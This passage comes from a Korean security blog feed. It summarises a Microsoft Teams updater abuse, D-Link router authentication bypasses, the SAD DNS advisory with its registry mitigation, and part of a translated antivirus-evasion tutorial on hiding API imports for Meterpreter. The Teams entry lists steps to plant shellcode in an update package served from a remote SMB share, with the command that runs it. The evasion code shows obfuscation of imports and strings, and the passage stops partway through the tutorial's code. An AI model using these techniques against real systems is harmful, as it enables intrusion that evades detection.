    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/">Microsoft Teams Updater Living off the Land</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Teams Updater</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams의 업데이트 프로그램을 lolbas(Living off the land binary and script)로 사용할 수 있습니다. 이전에 존재하던 code execution에 대한 취약점 수정은 URL을 통하여 업데이트 기능을 제한하는 것입니다. 하지만 업데이트 프로그램은 제품 업데이트를 위해 공유/로컬 폴더를 통한 로컬 연결이 가능합니다. 따라서 원격 SMB 공유 폴더를 통해 해당 패치를 우회할 수 있습니다.</p><p>이 취약점을 악용하기 위한 payload를 작성하는 단계는 다음과 같습니다.</p><ol><li><p><code>%localappdata%\Microsoft\Teams\packages</code>에서 Microsoft Teams pre-built package를 통해 nupkg 패키지 추출(ex. Teams-1.3.00.27559-full.nupkg)</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>에 shellcode를 <code>squirrel.exe</code> 파일로 넣은 후 압축</p></li><li><p>metadata 계산</p><p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p><p>output:</p><p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p></li><li><p><code>RELEASES</code> 파일을 생성한 후 위의 결과 값을 복사해서 저장</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg</code>와 <code>RELEASES</code> 파일을 메인 디렉터리에 넣고 원격 SMB 서버에 업로드</p></li></ol><p>피해자가 아래 명령어를 통해 해커의 원격 SMB 서버로 update를 진행하면 Microsoft Teams에 의해 다운로드되고 실행됩니다.</p><pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>microsoft</tag>
      
      <tag>teams</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Qualcomm DSP Achilles</title>
    <link href="/2020/12/16/fabu1ous/2020-12-16/"/>
    <url>/2020/12/16/fabu1ous/2020-12-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/#:~:text=One%20of%20the%20most%20common,the%20leading%20manufacturers%3A%20Qualcomm%20Technologies">Qualcomm DSP Achilles</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Qualcomm DSP chip</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint는 올해 Defcon에서 Achilles라는 연구 논문을 발표했습니다. Achilles는 Qualcomm DSP( Digital Signal Processor ) 칩에서 400개 이상의 취약점을 찾은 퍼징 기술 연구입니다. Qualcomm은 다양한 칩들을 생산하는 회사로, 스마트폰 시장의 40%가 Qualcomm의 칩을 사용하고 있기 때문에 Achilles에 주목해볼 필요가 있습니다.</p><p>DSP 칩들은 기본적으로 Black box로 관리되기 때문에, manufacturer가 아니라면 DSP 칩에 대한 정보가 제한적일 수밖에 없습니다. 이 칩을 사용해 스마트폰을 만드는 제조사도 예외는 아닙니다. Checkpoint는 black box 때문에 스마트폰 제조사들이 신속하게 이슈를 고치지 못하는 상황을 지적했습니다.</p><p>올해 5월 Zerodium이 ios exploit의 제보가 너무 많다는 이유로 구매 중지를 선언했습니다. Open source인 Android 보다 취약점 제보 건수가 많다는 것을 근거로 Closed source(black box)를 유지하던 ios의 보안성은 더 이상 효과 없다는 의견이 있습니다. ios 뿐만 아니라 모든 black box의 의미가 점점 희미해지고 있는 거 같습니다.</p><p>헤커들에겐 black box의 정보 폐쇄 효과는 점점 옅어지고, vendor 입장에선 이슈를 고치지 힘든 상황이 맞물려 Achilles 연구처럼 취약점이 뭉텅이로 나오는 일이 발생했다고 볼 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>qualcomm</tag>
      
      <tag>dsp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8863/8864 D-LINK ROUTER AUTHENTICATION BYPASSES</title>
    <link href="/2020/12/15/l0ch/2020-12-15/"/>
    <url>/2020/12/15/l0ch/2020-12-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses">THE ANATOMY OF A BUG DOOR: DISSECTING TWO D-LINK ROUTER AUTHENTICATION BYPASSES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-LINK router</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HNAP (Home Network Administration Protocol)는 Pure Networks Inc. 에서 개발 한 독점 SOAP 기반 프로토콜입니다. 현재는 이 프로토콜의 사용이 중단되었지만 여전히 업데이트되지 않은 많은 라우터들이 해당 프로토콜을 사용하고 있습니다.</p><p>HNAP에서 발견된 두 가지 취약점은 다음과 같습니다.</p><p>CVE-2020-8863은 <code>LoginPassword</code> 검증 과정에서 발생하는 authentication bypass 취약점입니다. <code>strncmp()</code> 에서 db 패스워드와 클라이언트가 입력한 <code>LoginPassword</code>를 <code>LoginPassword</code>의 size 만큼 비교하는데, 이때 <code>LoginPassword</code>에 빈 값을 전달하면 비교할 size가 0이 되어 무조건 인증에 성공하게 됩니다.</p><p>CVE-2020-8864는 HNAP PrivateLogin 인증 알고리즘의 잘못된 구현으로 인해 발생하는 authentication bypass 취약점입니다. HNAP를 통해 인증할 때 서버는 일반적으로 Private key를 사용자의 암호를 기반으로 생성합니다. 그러나 로그인 요청 중 <code>PrivateLogin</code> 필드에 “Username” 값을 넣어 요청하면 “Username”값으로 Private key를 생성해  실제 관리자 암호를 몰라도 인증 챌린지 값을 알 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>authentication bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>bug-door</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows Server DNS Resolver Spoofing 취약점 권고</title>
    <link href="/2020/12/14/idioth/2020-12-14/"/>
    <url>/2020/12/14/idioth/2020-12-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://dirteam.com/sander/2020/12/10/dns-spoofing-vulnerability-sad-dns-important-cve-2020-25705-adv200013/">Spoofing Vulnerability in DNS Resolver (SAD DNS, Important, CVE-2020-25705, ADV200013)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903</li><li>Windows Server, version 1909</li><li>Windows Server, version 2004</li><li>Windows Server, version 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020년 12월 8일에 마이크로소프트에서 DNS Resolver addressing spoofing 취약점에 대한 보안 공지(<a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200013">ADV200013</a>)가 발표됐습니다. 마이크로소프트는 해당 취약점을 통한 DNS cache poisoning attack을 막기 위해 DNS UDP 패킷의 크기를 제한하는 권고를 했습니다.</p><p>해당 취약점은 Windows TCP/IP stack에 제공되는 DNS Resolver Component에 존재합니다. DNS Resolver에 영향을 미치는 IP 조각화에 의해 DNS cache poisoning 취약점이 발생하며 해당 취약점을 exploit 한 해커는 DNS forwarder나 DNS Resolver에 의해 cache 된 DNS packet을 스푸핑 할 수 있습니다. 취약점을 성공적으로 exploit 하면 해커는 수정된 DNS record를 사용하여 해커의 웹사이트로 redirect 시킬 수 있습니다.</p><p>해당 취약점을 방지하기 위해 <code>MaximumUdpPacketSize</code> 레지스트리 값을 1,221 bytes로 수정해야 합니다. 수정된 후 DNS Resolver는 1,221 bytes보다 큰 모든 response를 TCP로 받아서 Windows Server 기반 DNS server에서 해당 취약점을 악용하려는 시도를 막을 수 있습니다.</p><p>DNS server가 실행되는 모든 Windows Server에서 관리자 권한 파워 쉘이나 원격 세션을 통한 아래의 명령줄을 실행하면 UDP 패킷 크기의 레지스트리 값을 변경할 수 있습니다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$RegPath</span> = <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Services\DNS\Parameters&quot;</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$RegPath</span> <span class="hljs-literal">-Name</span> MaximumUdpPacketSize `<span class="hljs-literal">-Value</span> <span class="hljs-number">1221</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span><span class="hljs-built_in">Restart-Service</span> DNS</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>sad dns</tag>
      
      <tag>dns cache poisoning</tag>
      
      <tag>dns resolver</tag>
      
      <tag>windows server</tag>
      
      <tag>adv200013</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.2</title>
    <link href="/2020/12/13/idioth/av_evasion_part2/"/>
    <url>/2020/12/13/idioth/av_evasion_part2/</url>
    
    <content type="html"><![CDATA[<p>저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.</p><p>저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이해가 안 되시는 부분이 있으시면 바로 지적해주시기 바랍니다!</p><blockquote><p>원문글 : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> 소프트웨어는 Windows 운영 체제와 상호 작용하기 위해 동적 링크 라이브러리(DLL)를 통해 함수를 가져온다. 이 함수들은 Import Address Table 테이블에 평문으로 작성되고 안티바이러스 소프트웨어는 이를 활용하여 악의적인 활동을 탐지한다. 우리는 Meterpreter를 중심으로 C/C++ 소프트웨어를 refactoring 하여 이러한 footprint를 제거할 수 있는 난독화 아이디어와 구현을 보여준다. 소스 코드는 <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>에서 확인할 수 있다.</p><h2 id="소개"><a href="#소개" class="headerlink" title="소개"></a>소개</h2><p>이전 글에서 정규식을 사용하지 않고 소스 코드에서 문자열 리터럴을 바꾸는 방법을 보여줬다. 바이너리의 footprint를 줄이고 정적 시그니처에 의존하는 보안 소프트웨어를 우회하는 것이 목적이다.</p><p>그러나 소스 코드의 문자열 리터럴 말고도 정적으로 수집하고 분석할 수 있는 정보들이 많다. 이 글은 바이너리에서 API import를 숨기는 방법과 C/C++로 작성된 모든 소프트웨어에서 그 작업을 자동화하는 방법에 대해서 다룰 것이다.</p><h2 id="API-imports의-문제점"><a href="#API-imports의-문제점" class="headerlink" title="API imports의 문제점"></a>API imports의 문제점</h2><p>간단한 C 프로그램을 아래와 같이 작성하고 빌드하자</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 가장 좋아하는 컴파일러로 빌드해라. MinGW는 <em>macOS</em>에서 <em>Windows</em>로 크로스 빌드를 하는 데 사용된다.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>그 후에 rabin2(radare2에 포함되어 있음) 또는 GNU strings 유틸리티를 사용하여 문자열을 리스트 할 수 있다.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   │ 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   │ 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 207   │ 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   │ 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   │ 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   │ 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   │ 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   │ 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   │ 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   │ 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   │ 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   │ 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   │ 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   │ 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>이 함수를 <code>User32.dll</code> 라이브러리에서 가져와야 하므로 MessageBoxA 문자열은 3번 나타난다.(뒤에서 자세히 설명)</p><p>MessageBoxA 문자열은 안티바이러스에서 감지되지 않지만 다음 API들은 감지될 것이다.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>…</li></ul><h2 id="API-imports-숨기기"><a href="#API-imports-숨기기" class="headerlink" title="API imports 숨기기"></a>API imports 숨기기</h2><p>윈도우 시스템에서 개발자들이 외부 라이브러리 함수를 호출하는 데 사용할 수 있는 방법들은 다음과 같다.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>외부 라이브러리 함수를 호출하는 기본적인 방법이며 링커에 의해 자동적으로 처리된다. 빌드 사이클 동안 애플리케이션은 각 동적 링크 라이브러리(DLL)의 import library(.lib)에 연결된다. 가져온 각 함수에 대해 링커는 DLL에 대한 내용을 IAT에 엔트리를 작성한다.</p><p>애플리케이션이 시작될 때, 운영체제는 IAT를 탐색하여 프로세스의 주소 공간에 있는 모든 라이브러리 리스트를 매핑하고 가져온 각 함수의 주소는 DLL의 Export Address Table에 해당 엔트리를 가리키도록 업데이트된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png"></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>다른 방법은 LoadLibrary로 해당 라이브러리를 로드한 후 GetProcAddress로 함수의 주소를 얻어 수동적으로 수행하는 것이다. 예를 들어 위의 예시를 run-time dynamic linking을 적용할 수 있다.</p><p>먼저 MessageBoxA API의 함수 포인터를 정의해야 한다. 시작하기 전에 C의 함수 포인터 구문에 대해 간단하게 설명한다.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>볼 수 있듯이 star operator(함수 포인터이므로)와  괄호를 제외하면 함수를 정의하는 구문과 같다.</p><p>이제 MessageBox의 프로토타입이 필요한데 Windows SDK의 <code>winuser.h</code> 혹은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>에서 찾을 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>앞서 말한 함수 포인터 구문은 정확한 정보로 업데이트할 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDN은 이 함수가 <code>User32.dll</code>에서 내보내진 다고 설명한다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png"></p><p>MessageBoxA API는 <code>User32.dll</code>에서 내보내 진다. 따라서 애플리케이션은 이 라이브러리를 먼저 로드해야 한다.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>그 후 <code>GetProcAddress</code>를 사용하여 위에서 정의한 함수 포인터에 정확한 주소를 할당할 수 있다.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>여기서 원래 예를 <code>MessageBoxA</code> 대신 <code>fMessageBoxA</code>를 호출하도록 수정해야 하며 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>HWND, LCTSTR, UINT</code> 데이터 타입을 위해 <code>Windows.h</code> include가 필요하다. 이 간단한 예제를 빌드하고 실행하면 예상대로 alert box가 실행된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png"></p><p>run-time dynamic linking을 하기 위해 <code>LoadLibrary</code>와 <code>GetProcAddress</code>을 사용하는 간단한 예시</p><h3 id="최종-적용"><a href="#최종-적용" class="headerlink" title="최종 적용"></a>최종 적용</h3><p><code>strings toto.exe</code>를 실행하면 아직 <code>User32.dll</code>과 <code>MessageBoxA</code> 문자열이 나타난다. 이 문자열들은 암호화되어야 하지만 이전 글에서 보여준 간단한 난독화 트릭으로 안티바이러스 탐지를 우회할 수 있다. 최종 결과는 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">char</span> user32[] = &#123;<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이번에는 <code>strings</code>와 <code>rabin2</code> 둘 다 문자열을 찾을 수 없다.</p><pre><code class="hljs cpp">➜  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe➜  strings /tmp/toto.exe | grep MessageBox➜  rabin2 -zz /tmp/toto.exe | grep MessageBox➜</code></pre><h2 id="자동화된-소스-코드-리팩터링"><a href="#자동화된-소스-코드-리팩터링" class="headerlink" title="자동화된 소스 코드 리팩터링"></a>자동화된 소스 코드 리팩터링</h2><p>이전 글에 설명된 것과 같은 방법으로 기존 코드 베이스를 refactoring 하여 의심스러운 API를 런타임에 로드하고 Import Address Table에서 제거할 수 있다. <code>libTooling</code>으로 구현된 기존의 작업을 기반으로 할 것이다.</p><p>이 작업을 다음과 같이 나열해보자.</p><ul><li>이전 예제의 추상 구문 트리를 생성해라. 함수 호출을 수정하기 위해 노드를 조작하는 방법을 이해하는데 필요하다.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>를 사용하여 지정된 API에 대한 API 코드 베이스의 모든 함수 호출을 찾아라.</li><li>다른 함수 식별자로 모든 호출을 대체해라.</li><li>각 함수 호출 전에 <code>LoadLibrary/GetProcAddress</code> 호출을 삽입하라.</li><li>작동하는지 확인해라.</li><li>모든 의심스러운 API를 종합하고 난독화해라.</li></ul><h3 id="MessageBox-애플리케이션의-추상-구문-트리"><a href="#MessageBox-애플리케이션의-추상-구문-트리" class="headerlink" title="MessageBox 애플리케이션의 추상 구문 트리"></a>MessageBox 애플리케이션의 추상 구문 트리</h3><p>원본 MessageBox 애플리케이션의 Clang 추상 구문 트리를 보기 위해 당신의 Windows SDK 경로를 적용하여 스크립트를 사용하자</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png"></p><p>MessageBoxA API를 호출하는 간단한 애플리케이션의 Clang 추상 구문 트리</p><p>CallExpr 유형의 AST 노드를 찾으면 소스 코드에서의 함수 호출을 찾을 수 있다. 위 사진에 나와있는 것처럼 실제 호출되는 함수 이름은 하위 노드 중 하나에 지정되어 있으므로 나중에 접근할 수 있어야 한다.</p><h3 id="특정-API의-함수-호출-찾기"><a href="#특정-API의-함수-호출-찾기" class="headerlink" title="특정 API의 함수 호출 찾기"></a>특정 API의 함수 호출 찾기</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 특정 함수에 대한 모든 함수 호출을 열거하는데 필요하다. 우선 이전 글에서 사용된 것보다 더 복잡하므로 이 matcher에 맞는 구문을 얻는 것이 중요하다. 적합한 것을 찾기 위해서 소스 코드에서 custom query를 실행할 수 있는 interactive tool인 <code>clang-query</code>를 사용했다. 흥미롭게도 이것은 libTooling 기반이고 이 글에서 보여준 어떤 것보다 훨씬 강력하다.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>시행착오와 명령 줄 완성(tab completion)으로 빠르게 작업 솔루션에 접근할 수 있었다. matcher가 잘 동작하는 것을 확인했으니 이전 글에서 수행한 것과 같은 새로운 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>를 생성할 수 있다. <code>clang-query</code>를 사용하여 수행한 것을 C++ 재현하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span 